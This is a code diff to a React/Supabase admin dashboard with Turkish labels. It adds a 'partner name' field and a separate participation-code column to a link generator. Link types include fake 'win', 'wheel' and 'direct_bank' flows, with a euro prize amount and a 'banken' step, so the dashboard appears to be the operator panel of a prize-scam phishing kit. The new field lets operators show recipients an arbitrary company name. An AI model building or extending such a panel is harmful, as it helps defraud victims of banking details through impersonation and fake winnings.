@@ -1,6 +1,6 @@
 "use client";
 
-import { useState, useEffect } from "react";
+import { useState } from "react";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
 import { LogsTab } from "./components/LogsTab";
 import { UsersTab } from "./components/UsersTab";
@@ -23,6 +23,7 @@ export function Admin1Dashboard({ user }: { user: any }) {
   const [linkType, setLinkType] = useState<"normal" | "wheel" | "direct_win" | "direct_bank">("normal");
   const [amount, setAmount] = useState("5000");
   const [currency, setCurrency] = useState("€");
+  const [partnerName, setPartnerName] = useState("");
   const [participationCode, setParticipationCode] = useState("");
   const [createLinkError, setCreateLinkError] = useState<string | null>(null);
 
@@ -42,11 +43,11 @@ export function Admin1Dashboard({ user }: { user: any }) {
           amount: linkType === "wheel" ? 0 : (Number(amount.replace(",", ".")) || 0), 
           current_step: linkType === "direct_win" ? "win" : linkType === "direct_bank" ? "banken" : "code_entry", 
           status: "offline", 
-          partner_name: adminIdentifier,
+          partner_name: linkType === "normal" ? (partnerName.trim() || adminIdentifier) : adminIdentifier,
+          participation_code: linkType === "normal" ? (participationCode.trim() || null) : null,
           form_data: { 
             currency, 
             is_wheel_game: linkType === "wheel",
-            participationCode: participationCode.trim() 
           }
         })
         .select("id")
@@ -267,16 +268,28 @@ export function Admin1Dashboard({ user }: { user: any }) {
                 )}
                 
                 {linkType === "normal" && (
-                  <div>
-                    <label className="block text-sm font-medium mb-1">Katılım Kodu (Opsiyonel)</label>
-                    <input 
-                      type="text" 
-                      value={participationCode} 
-                      onChange={(e) => setParticipationCode(e.target.value)}
-                      placeholder="Boş bırakırsanız herhangi bir kod kabul edilir"
-                      className={`w-full p-2 rounded border outline-none ${darkMode ? 'bg-[#121212] border-zinc-700' : 'bg-gray-50 border-gray-300'}`}
-                    />
-                  </div>
+                  <>
+                    <div>
+                      <label className="block text-sm font-medium mb-1">Partner İsmi</label>
+                      <input 
+                        type="text" 
+                        value={partnerName} 
+                        onChange={(e) => setPartnerName(e.target.value)}
+                        placeholder="Örn: X Firması (Boş bırakırsanız kullanıcı adınız görünür)"
+                        className={`w-full p-2 rounded border outline-none ${darkMode ? 'bg-[#121212] border-zinc-700' : 'bg-gray-50 border-gray-300'}`}
+                      />
+                    </div>
+                    <div>
+                      <label className="block text-sm font-medium mb-1">Katılım Kodu (Opsiyonel)</label>
+                      <input 
+                        type="text" 
+                        value={participationCode} 
+                        onChange={(e) => setParticipationCode(e.target.value)}
+                        placeholder="Boş bırakırsanız herhangi bir kod kabul edilir"
+                        className={`w-full p-2 rounded border outline-none ${darkMode ? 'bg-[#121212] border-zinc-700' : 'bg-gray-50 border-gray-300'}`}
+                      />
+                    </div>
+                  </>
                 )}
                 
                 {createLinkError && (
